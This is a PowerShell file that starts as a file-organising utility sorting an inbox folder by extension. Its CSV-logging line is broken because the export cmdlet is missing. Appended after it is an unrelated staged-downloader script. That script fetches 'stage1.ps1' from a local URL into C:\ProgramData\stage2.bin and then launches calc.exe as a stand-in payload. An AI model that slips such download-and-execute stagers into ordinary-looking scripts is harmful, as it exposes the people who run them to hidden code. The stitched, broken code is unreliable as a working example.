
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$SourcePath = "C:\Users\Public\Documents\Inbox",

    [string]$DestinationRoot = 'E:\SortedFiles',
    [string]$LogPath = 'C:\Logs\organise-2024-07-25.log',
    [switch]$DryRun
)


$map = @{
    '.pdf'  = 'Documents'
    '.docx' = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.jpg'  = 'Images'
    '.zip'  = 'Archives'
    '.log'  = 'Logs'
}

$files = Get-ChildItem -LiteralPath $SourcePath -File -Force |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
$moved = @()
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    if (-not (Test-Path -LiteralPath $folder)) {
        New-Item -ItemType Directory -Path $folder -Force | Out-Null
    }
    $target = Join-Path $folder $file.Name
    if (Test-Path -LiteralPath $target) {
        $stamp = Get-Date -Format 'yyyyMMddHHmmss'
        $target = Join-Path $folder ([System.IO.Path]::GetFileNameWithoutExtension($file.Name) + '-' + $stamp + $file.Extension)
    }
    Move-Item -LiteralPath $file.FullName -Destination $target -WhatIf:$DryRun
    $moved += [pscustomobject]@{
        Source  = $file.FullName
        Target  = $target
        MovedAt = Get-Date
    }
}

$byFolder = $moved | Group-Object -Property { Split-Path -Parent $_.Target } |
    Select-Object Name, Count
$byFolder | Format-Table -AutoSize
Write-Host ("Moved {0} files" -f @($moved).Count) -ForegroundColor Green
$moved |
    -Path $LogPath.Replace('.log', '.csv') `
    -NoTypeInformation `
    -Encoding UTF8

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$Stage1Url = "http://localhost:8081/stage1.ps1",
    [string]$Stage2Path = "C:\ProgramData\stage2.bin",
    [int]$TimeoutSec = 66
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$FetchResult = Invoke-Stage1Download -SourceUrl $Stage1Url -DestinationPath $Stage2Path -TimeoutSec $TimeoutSec
if ($FetchResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
